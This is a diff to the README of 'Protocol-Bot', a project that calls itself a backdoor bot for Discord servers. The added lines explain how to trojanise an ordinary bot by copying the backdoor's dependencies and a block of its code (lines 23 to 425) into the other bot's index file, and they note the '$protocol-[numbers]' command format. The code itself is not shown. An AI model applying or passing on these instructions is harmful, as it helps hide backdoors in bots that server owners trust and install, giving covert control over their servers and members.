@@ -1,6 +1,9 @@
 # Protocol-Bot
 A backdoor bot for discord servers
+
 It can be placed inside of another bots code in the index file if you want to try backdooring a normal bot.
+## Backdooring
+It can be easily merged with another one of my bots because it has the same structure, to merge this with another type of bot, copy over the node modules dependencies, copy over the dependencies part in the index file, then copy line 23 to 425 and paste it in the index.
 ## Documentation
 Commands -    (Do command in chat '$protocol-002' for help) (All commands will be like this as an example '$protocol-[numbers]')
 
